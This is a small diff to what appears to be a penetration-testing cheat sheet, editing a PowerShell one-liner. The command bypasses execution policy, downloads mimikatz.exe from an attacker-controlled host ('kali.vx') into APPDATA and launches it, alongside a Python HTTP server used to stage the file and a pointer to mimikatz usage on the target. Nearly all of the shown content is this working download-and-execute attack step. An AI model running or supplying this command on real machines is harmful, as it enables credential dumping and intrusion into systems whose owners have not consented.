@@ -21,8 +21,9 @@ sudo python3 -m http.server 80 &> /dev/null &
 - Run: `Start-Process`
 
 ```console
-powershell.exe -nop -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/mimikatz.exe', $env:APPDATA + '\mimikatz.exe'); Start-Process $env:APPDATA\mimikatz.exe
+powershell.exe -NoProfile -ExecutionPolicy Bypass (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/mimikatz.exe', $env:APPDATA + '\mimikatz.exe'); Start-Process $env:APPDATA\mimikatz.exe
 ```
+
 **On Target**: mimikatz commands
 - Ref: <https://tools.thehacker.recipes/mimikatz>
 
